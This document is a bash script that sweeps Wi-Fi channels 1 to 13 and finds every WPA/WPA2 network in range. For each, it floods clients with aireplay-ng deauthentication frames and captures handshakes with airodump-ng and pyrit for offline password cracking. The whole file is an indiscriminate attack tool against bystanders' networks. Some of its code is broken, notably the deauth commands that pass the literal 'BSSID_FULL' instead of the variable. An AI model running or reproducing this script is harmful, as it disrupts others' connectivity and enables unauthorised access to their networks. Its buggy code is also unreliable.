# Checking for arguments
if [ $# -lt 1 ]
  then
    echo "Not enough arguments supplied"
    echo "Usage: ./crackWPA.sh  <monitor_interface>"  
    exit
fi

TIME2SCAN=10
WAIT_CLIENT=30
MONITOR=$1
DATE=`date '+%Y_%m_%d_%H_%M_%S'`
DEAUTH_SLEEP=3
DEAUTH_TIMEOUT=180
# iterate over each channel 
for ch in {1..13}; 
    do echo "Scanning channel "$ch;
    #run for N seconds
    FOLDER="Scans/$ch"
    mkdir -p $FOLDER
    sudo airodump-ng -w "$FOLDER/$DATE-channel-$ch" --output-format csv --write-interval 1 -c $ch --manufacturer $MONITOR &> /dev/null &
    echo "Sleeping for $TIME2SCAN seconds while scanning channel $ch"
    #sleep $TIME2SCAN
    secs=$TIME2SCAN
    while [ $secs -gt 0 ]; do
        echo -ne "$secs\033[0K\r"
        sleep 1
        secs=$((secs - 1))
    done

    #sudo killall airodump-ng
    CSV=$(ls "$FOLDER/"*.csv |tail -n 1);
    #echo $CSV
    IFS=$'\n'
    # in each channel look for WPA/WPA2 
    TEMP=$(grep "WPA\|WPA2" "$CSV"|awk -F, '$14!=" "') #retrieves all WPA/WPA2 wifis available
    echo "$TEMP"
    #BSSID_CHANNEL=($(echo $TEMP | awk -F"," '{print $4}'|tr -d " ")) #case in which channel is mixed
    BSSID=($(echo "$TEMP" | awk -F"," '{print $1}' | tac))
    echo "BSSIDs $BSSID"
    ESSID=($(echo "$TEMP" | awk -F"," '{print $14}'|tr -d " " | tac))
    echo "ESSID $ESSID"
    # For each BSSID create folder named BSSID
    counter=0
    for essid in $ESSID; do
        BSSID_CHANNEL=($(echo "$TEMP" | awk -F"," '{print $4}'|tr -d " "))
        #echo "bssid channel: $BSSID_CHANNEL"
        if [ $ch == $BSSID_CHANNEL ]; then #checking for wifis in another channel
            #echo " BBSID-ESSID: $bssid - $essid "
            #echo "elements " "${#BSSID[@]}"
            BSSID_NAME=$(echo "${BSSID[$counter]}"|sed 's/:/_/g')
            BSSID_FULL=$(echo "${BSSID[$counter]}")
            echo "Scanning essid: $essid || bssid: $BSSID_FULL"
            mkdir -p "$FOLDER/$essid-$BSSID_NAME"
            sudo airodump-ng  -c $ch --bssid $BSSID_FULL -w "$FOLDER/$essid-$BSSID_NAME/$essid" -o cap -o csv --write-interval 1 $MONITOR &> /dev/null & 
            #sudo airodump-ng  -c 6 --bssid 48:D3:43:58:1F:C1 -w "$FOLDER/VTRTEST/VTRTEST" -o pcap -o csv --write-interval 1 $MONITOR &> /dev/null & 
            AIRODUMP_PID=$!
            sleep 3
            echo "Deauthenticating router to get clients"
            #mas pasadas
            sudo aireplay-ng -0 10 -a BSSID_FULL $MONITOR &> /dev/null &
            echo "Sleeping for $WAIT_CLIENT seconds while waiting for clients"
            #sleep $WAIT_CLIENT
            secs=$WAIT_CLIENT
            while [ $secs -gt 0 ]; do
                echo -ne "$secs\033[0K\r"
                sleep 1
                secs=$((secs - 1))
            done
            # CSV from the specific AP monitoring
            ESSID_CSV=$(ls "$FOLDER/$essid-$BSSID_NAME/"*.csv |tail -n 1)
            #echo "csv essid: $ESSID_CSV"
            # Calculate how many clients
            CLIENT_COUNT=$(grep "Station MAC" $ESSID_CSV -A 100 | sed -n '1!p' | grep -v '^[[:space:]]*$' | wc -l)
            echo "Client count: $CLIENT_COUNT"
            #handshakes = script calcula handshakes de un .cap
            # Deauth until captured 3 hanshakes
            CAP_FILE=$(ls "$FOLDER/$essid-$BSSID_NAME/"*.cap |tail -n 1);
            HANDSHAKES=$(pyrit -r $CAP_FILE analyze 2> /dev/null | grep "HMAC_SHA1_AES" | wc -l)
            echo "handshakes: $HANDSHAKES"
            DEAUTH_COUNTER=0
            if [ $CLIENT_COUNT -gt 0 ]; then
                while [ $HANDSHAKES -lt 3 ]; do
                    FINAL_TIMEOUT=$(($DEAUTH_SLEEP * $DEAUTH_COUNTER))
                    if [ $FINAL_TIMEOUT -lt $DEAUTH_TIMEOUT ]; then
                        echo "Deauthenticating... Gotten $HANDSHAKES handshakes"
                        # deauth until N handshakes 
                        sudo aireplay-ng -0 5 -a BSSID_FULL $MONITOR &> /dev/null &
                        echo "Waiting " #$DEAUTH_SLEEP seconds for client reconnection"
                        #Wait 10 seconds for client reconnection
                        #sleep $DEAUTH_TIMEOUT
                        secs=$DEAUTH_SLEEP
                        while [ $secs -gt 0 ]; do
                             echo -ne "$secs\033[0K\r"
                            sleep 1
                            secs=$((secs - 1))
                        done
                        # Count handshakes again
                        sleep 3
                        HANDSHAKES=$(pyrit -r $CAP_FILE analyze 2> /dev/null | grep "HMAC_SHA1_AES" | wc -l)
                        DEAUTH_COUNTER=$(($DEAUTH_COUNTER + 1))
                    else
                        break
                    fi
                done

            else
                echo "Killing airodump pid: $AIRODUMP_PID"
                #sudo kill $AIRODUMP_PID
                sudo killall airodump-ng
            fi
        else
            echo "no son na iguales $ch y $BSSID_CHANNEL"
        fi
        echo "sleeping another $TIME2SCAN seconds"
        sleep $TIME2SCAN
        counter=$(($counter + 1))
    done
done
